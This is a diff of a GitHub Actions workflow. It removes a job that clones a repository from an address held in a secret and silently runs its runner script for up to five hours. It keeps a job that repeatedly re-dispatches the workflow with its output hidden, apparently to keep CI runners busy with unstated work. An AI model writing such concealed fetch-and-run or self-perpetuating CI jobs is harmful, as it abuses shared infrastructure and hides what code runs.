@@ -4,16 +4,6 @@ on:
   workflow_dispatch: {}
 permissions: { contents: write, actions: write }
 jobs:
-  a:
-    runs-on: ubuntu-latest
-    timeout-minutes: 300
-    concurrency: { group: a, cancel-in-progress: false }
-    steps:
-      - name: run
-        env: { CFG: "${{ secrets.CFG }}", GH_TOKEN: "${{ github.token }}" }
-        run: |
-          { printf '%s\n' "$CFG" | sed 's/\r$//' > "$RUNNER_TEMP/c"; set -a; . "$RUNNER_TEMP/c"; set +a; rm -f "$RUNNER_TEMP/c"
-            git clone -q --depth 1 "$SRC" w && bash w/scripts/runner.sh; } >/dev/null 2>&1 || true
   b:
     runs-on: ubuntu-latest
     timeout-minutes: 25
@@ -32,7 +22,7 @@ jobs:
         env: { GH_TOKEN: "${{ github.token }}", R: "${{ github.repository }}" }
         run: |
           { m=$((10#$(date -u +%M))); w=$(( ( (27 - m % 20 + 20) % 20 ) * 60 )); [ $w -lt 60 ] && w=$((w+1200)); sleep $w
-            busy=$(gh api "repos/$R/actions/runs?per_page=20" --jq "[.workflow_runs[]|select(.id!=${{ github.run_id }} and (.status==\"queued\" or .status==\"in_progress\" or .status==\"waiting\"))]|length")
+            busy=$(gh api "repos/$R/actions/workflows/run.yml/runs?per_page=20" --jq "[.workflow_runs[]|select(.id!=${{ github.run_id }} and (.status==\"queued\" or .status==\"in_progress\" or .status==\"waiting\"))]|length")
             recent=$(gh api "repos/$R/actions/runs?event=schedule&per_page=1" --jq ".workflow_runs[0].created_at // \"\"")
             fresh=0; [ -n "$recent" ] && [ $(( $(date +%s) - $(date -d "$recent" +%s) )) -lt 900 ] && fresh=1
             [ "$busy" = "0" ] && [ $fresh = 0 ] && gh workflow run run.yml -R "$R"; } >/dev/null 2>&1 || true
